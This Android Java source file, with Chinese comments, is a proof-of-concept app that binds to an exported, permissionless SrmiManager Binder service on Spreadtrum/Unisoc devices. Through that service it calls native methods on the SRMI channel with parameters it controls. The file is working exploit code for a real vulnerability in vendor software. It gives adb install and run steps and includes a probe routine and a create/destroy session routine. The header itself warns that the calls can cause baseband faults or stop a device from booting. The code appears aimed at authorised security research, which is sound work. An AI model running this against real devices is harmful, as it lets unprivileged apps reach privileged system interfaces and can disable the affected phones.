/*
 * V13 PoC - SrmiManager 导出 Binder 服务
 * ============================================================
 * 背景:
 *   com.sprd.srmi 的 SrmiManager 是一个 exported=true 且无 permission 的 Service,
 *   实现 com.sprd.srmi.ISrmiService 接口, 暴露 20+ 个 native 方法,
 *   可直接向 SRMI (System Resource Management Interface) 通道发送/接收消息,
 *   所有参数 (name / srmiCommType / msgId / attr / value) 均由调用方控制。
 *
 * 编译:
 *   mkdir -p out && \
 *   aapt2 link -o out/empty.apk --manifest AndroidManifest.xml -I $ANDROID_JAR
 *   # 更简单: 用 Android Studio 建空项目, 把 aidl + java 放进去
 *   或使用 build.sh (见同目录)
 *
 * 运行:
 *   adb install -r SrmiClient.apk
 *   adb shell am start -n com.poc.srmi/.MainActivity
 *   adb logcat -s SrmiPoc
 *
 * ⚠️ 法律声明: 仅供授权测试。向 SRMI 发送未知消息可能导致基带异常/无法开机。
 */
package com.poc.srmi;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import com.sprd.srmi.ISrmiService;

public class MainActivity extends Activity {

    private static final String TAG = "SrmiPoc";
    private static final String PKG = "com.sprd.srmi";
    private static final String CLS = "com.sprd.srmi.SrmiManager";

    private ISrmiService mSrmi = null;
    private TextView mOut;

    private final ServiceConnection mConn = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mSrmi = ISrmiService.Stub.asInterface(service);
            log("[+] 已绑定 SrmiManager, binder=" + service);
            probe();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            mSrmi = null;
            log("[-] 服务断开");
        }
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);

        Button btnBind = new Button(this);
        btnBind.setText("1. 绑定 SrmiManager");
        btnBind.setOnClickListener(v -> doBind());
        root.addView(btnBind);

        Button btnProbe = new Button(this);
        btnProbe.setText("2. 只读探测（安全）");
        btnProbe.setOnClickListener(v -> probe());
        root.addView(btnProbe);

        Button btnCreate = new Button(this);
        btnCreate.setText("3. create() 探测（可能影响 SRMI 状态）");
        btnCreate.setOnClickListener(v -> doCreate());
        root.addView(btnCreate);

        ScrollView sv = new ScrollView(this);
        mOut = new TextView(this);
        mOut.setTextIsSelectable(true);
        sv.addView(mOut);
        root.addView(sv, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f));

        setContentView(root);
        log("PoC 就绪。点击 1 开始绑定。");
    }

    private void log(String s) {
        Log.i(TAG, s);
        if (mOut != null) mOut.append(s + "\n");
    }

    private void doBind() {
        Intent i = new Intent();
        i.setClassName(PKG, CLS);
        // 显式 intent-filter action，也可省略（组件已导出）
        i.setAction("com.sprd.srmi.ISrmiService");
        boolean ok = bindService(i, mConn, Context.BIND_AUTO_CREATE);
        log(ok ? "[*] bindService 已发起" : "[!] bindService 失败");
    }

    /** 只读探测：调用 get* 系列，不会改变系统状态 */
    private void probe() {
        if (mSrmi == null) { log("[!] 未绑定，先点 1"); return; }
        log("--- 只读探测 ---");
        String[] names = {"srmi_test", "poc", "wifi", "modem"};
        int[] types = {0, 1, 2};
        for (String n : names) {
            for (int t : types) {
                try {
                    String s = mSrmi.getStringExtra(n, t, 0, 0);
                    int v = mSrmi.getIntExtra(n, t, 0, 0);
                    log(String.format("  name=%-10s type=%d  str=%s  int=%d", n, t, s, v));
                } catch (RemoteException e) {
                    log("  RemoteException: " + e.getMessage());
                } catch (Throwable th) {
                    log("  " + th.getClass().getSimpleName() + ": " + th.getMessage());
                }
            }
        }
        log("--- 探测结束（未做任何写操作）---");
    }

    /** create() 会真正创建 SRMI 会话句柄，可能导致资源占用，默认需手动点击 */
    private void doCreate() {
        if (mSrmi == null) { log("[!] 未绑定，先点 1"); return; }
        try {
            int h = mSrmi.create("poc_session", 0);
            log("[+] create(\"poc_session\",0) 返回句柄 = " + h);
            // 立刻销毁，避免残留
            mSrmi.destroy("poc_session", 0);
            log("[+] destroy(\"poc_session\",0) 已完成（已清理）");
        } catch (Throwable th) {
            log("[!] " + th.getClass().getSimpleName() + ": " + th.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        if (mSrmi != null) {
            try { unbindService(mConn); } catch (Throwable ignored) {}
            mSrmi = null;
        }
        super.onDestroy();
    }
}
